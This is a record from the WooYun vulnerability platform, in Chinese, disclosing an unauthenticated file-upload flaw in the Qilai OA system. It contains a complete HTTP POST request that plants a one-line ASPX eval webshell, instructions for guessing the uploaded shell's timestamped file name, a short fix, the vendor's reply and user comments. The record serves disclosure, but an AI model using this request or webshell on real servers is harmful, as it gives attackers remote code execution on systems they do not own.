{"id": 1356, "wybug_id": "wooyun-2014-065391", "wybug_title": "某OA系统无需登录GetShell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2014-06-18 16:45", "wybug_open_date": "2014-09-16 16:46", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-16：\t细节向公众公开  简要描述： 某OA系统无需登录GetShell，官方demo已GetShell 详细说明：  官方：http://www.qioa.cn/启莱OA（包括标准版，政务办，教育版，工程版）官方案例：http://www.qioa.cn/index.php?m=content&c=index&a=lists&catid=7用户还是很多的。启莱OA标准版官方演示地址：http://test.oawin.net:8888/Login.aspx   漏洞证明：  上传地址：http://test.oawin.net:8888/Client/UserInfo_update.aspx?user=admin在用户头像上传处，虽然是在登陆后才能进行的功能，存在两个缺陷：1、但是这里在上传文件时，判断用户登陆存在缺陷，不用登陆也能直接上传2、在上上传是没有判断文件后缀，直接上传任意文件发送请求如下：\nPOST /Client/UserInfo_update.aspx?user=admin HTTP/1.1Host: test.oawin.net:8888User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------16733431817708Content-Length: 1715-----------------------------16733431817708Content-Disposition: form-data; name=\"__VIEWSTATE\"-----------------------------16733431817708Content-Disposition: form-data; name=\"Sex\"男-----------------------------16733431817708Content-Disposition: form-data; name=\"Bothday\"2012-2-10-----------------------------16733431817708Content-Disposition: form-data; name=\"uploadFile\"; filename=\"123.aspx\"Content-Type: image/jpeg<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"cmd\"],\"unsafe\");%>-----------------------------16733431817708Content-Disposition: form-data; name=\"Tel\"-----------------------------16733431817708Content-Disposition: form-data; name=\"Fax\"-----------------------------16733431817708Content-Disposition: form-data; name=\"MoveTel\"-----------------------------16733431817708Content-Disposition: form-data; name=\"LittleTel\"-----------------------------16733431817708Content-Disposition: form-data; name=\"Email\"-----------------------------16733431817708Content-Disposition: form-data; name=\"QQNum\"-----------------------------16733431817708Content-Disposition: form-data; name=\"Msn\"-----------------------------16733431817708Content-Disposition: form-data; name=\"ICQ\"-----------------------------16733431817708Content-Disposition: form-data; name=\"Address\"-----------------------------16733431817708Content-Disposition: form-data; name=\"ZipCode\"-----------------------------16733431817708Content-Disposition: form-data; name=\"HomeTel\"-----------------------------16733431817708Content-Disposition: form-data; name=\"Button1\"提交-----------------------------16733431817708--\n\n\n虽然会提示登陆超时，但是依然成功更新，成功上传aspx文件。上传后的shell地址为：http://test.oawin.net:8888/SystemManage/User/file/年月日时分秒+7位数字.aspx如：http://test.oawin.net:8888/SystemManage/User/file/20146181626151851927.aspx在同一秒内，我们可以上传很多文件，这样大大加大了文件名猜解速度。来一张官方demo的shell：\n\n   修复方案：  严格控制用户验证限制上传问价类型   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-06-23 08:35 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-18 16:57 |    \t\treality0ne \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:7        )\t\t \n  官方demo23333333    \n     2014-06-18 16:57 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  真是一天到晚都那啥啊    \n     2014-06-18 17:00 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @wefgod 呵呵    \n     2014-06-18 17:04 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @wefgod 呵呵    \n     2014-06-18 19:22 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xfkxfk @xsser 二位为何如此高兴？莫非二位之间……    \n     2014-09-16 16:50 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  又是判断权限后没有用response.end的临时工。。    \n     2014-09-16 17:41 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  那个地址怎么知道是那种格式的    \n     2014-09-20 21:25 |    \t\tMxx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 没有)\t\t \n  马克    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}